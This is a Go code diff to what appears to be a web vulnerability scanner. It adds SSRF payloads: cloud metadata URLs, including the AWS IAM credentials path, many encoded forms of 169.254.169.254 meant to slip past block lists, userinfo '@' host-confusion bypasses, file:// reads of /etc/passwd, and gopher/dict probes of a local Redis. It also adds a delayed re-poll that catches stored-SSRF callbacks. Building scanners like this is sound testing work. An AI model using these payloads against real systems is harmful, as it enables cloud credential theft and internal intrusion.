@@ -94,22 +94,65 @@ func FrameworkSSRFPayloads(webhookURL, allowedHost string) []string {
 	}
 
 	// The ones that need no callback at all. An SSRF that returns the response proves itself, and
-	// these are the targets worth asking for.
+	// these are the targets worth asking for. ALL OF THESE ARE SELF-PROVING, so they stay LAST, after
+	// every redirect/host-confusion form above: ProbeSSRFVector records one proof per signal in list
+	// order, and keeping the response reads after the redirect forms is what stops a medium open
+	// redirect from masking a high file or metadata read on the same parameter. None of them carries
+	// the webhook host or the canary placeholder, so none of them touches per-parameter attribution.
 	payloads = append(payloads,
 		"file:///etc/passwd",
 		"file:///c:/windows/win.ini",
+
+		// Cloud instance metadata. The canonical dotted quad is the address a block list stops by name;
+		// MOST forms below are 169.254.169.254 written so a naive check does not recognise it (decimal,
+		// hex, octal, mixed, trailing-dot, IPv6-mapped, nip.io/sslip.io), alongside the AWS credentials
+		// leaf, the Azure and GCP-by-address paths, Google's metadata.google.internal, Alibaba's
+		// 100.100.100.200, and 0.0.0.0 (a loopback/metadata-equivalent some stacks route to the IMDS).
+		// Until now only 127.0.0.1 carried its alternate encodings, so a filter that blocked just the
+		// canonical metadata address let all of these straight through.
 		"http://169.254.169.254/latest/meta-data/",
+		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+		"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
 		"http://metadata.google.internal/computeMetadata/v1/",
+		"http://169.254.169.254/computeMetadata/v1/",
 		"http://100.100.100.200/latest/meta-data/",
+		"http://2852039166/latest/meta-data/",
+		"http://0xA9FEA9FE/latest/meta-data/",
+		"http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
+		"http://0251.0376.0251.0376/latest/meta-data/",
+		"http://0xA9.0376.169.0xFE/latest/meta-data/",
+		"http://169.254.43518/latest/meta-data/",
+		"http://169.254.169.254./latest/meta-data/",
+		"http://[::ffff:169.254.169.254]/latest/meta-data/",
+		"http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+		"http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
+		"http://0.0.0.0/latest/meta-data/",
+		"http://169.254.169.254.nip.io/latest/meta-data/",
+		"http://169.254.169.254.sslip.io/latest/meta-data/",
+
 		"http://127.0.0.1/",
 		"http://127.0.0.1:22/",
 		"http://[::1]/",
-		// 127.0.0.1 as a single decimal integer, which many validators do not recognise as local.
 		"http://2130706433/",
 		"http://0177.0.0.1/",
+
 		"dict://127.0.0.1:6379/info",
 		"gopher://127.0.0.1:6379/_INFO",
+		"ftp://127.0.0.1/",
+		"sftp://127.0.0.1/",
+		"ldap://127.0.0.1/",
+		"tftp://127.0.0.1/",
 	)
+
+	// The userinfo bypass aimed at the metadata address: a validator reading the host as everything
+	// before the @ sees the allowed host and passes it, while the fetcher connects to what follows.
+	// Only when an allowed host is known, because without one there is nothing to put before the @.
+	if allowedHost != "" {
+		payloads = append(payloads,
+			"http://"+allowedHost+"@169.254.169.254/latest/meta-data/",
+			"http://"+allowedHost+"@2852039166/latest/meta-data/",
+		)
+	}
 	return payloads
 }
 
@@ -198,3 +241,22 @@ func CheckWebhookResults(ctx context.Context, settings map[string]any, tokens ma
 // answering ours, and a queue or a retry can put seconds between the two. Reading immediately finds
 // an empty inbox and reports no SSRF on a target that is about to call.
 const webhookSettleDelay = 20 * time.Second
+
+// webhookSecondOrderDelay is how long AFTER the first read the scanner waits before reading the
+// results URL a second and final time.
+//
+// webhookSettleDelay covers the target that fetches the payload WHILE it answers. A STORED SSRF does
+// not: the payload is saved and a backend job (a thumbnailer, a link unfurler, a webhook retry, a
+// moderation queue) fetches it later, on the timescale a queue, a cron or a retry runs on, long after
+// the first read gave up and reported nothing out of band. This second read is the one that turns
+// that late callback into a finding, attributed by its canary to the exact vector and parameter that
+// planted it. Minutes, not seconds, for that reason; a scan that already ran for hours can afford it,
+// and it is the last thing the run does.
+const webhookSecondOrderDelay = 3 * time.Minute
+
+// Phase labels for collectWebhookFindings, so a failed read records which window went unchecked: the
+// whole out-of-band half (first read) or only the delayed stored-SSRF window (second-order re-poll).
+const (
+	webhookPhaseFirst       = "first read"
+	webhookPhaseSecondOrder = "second-order re-poll"
+)
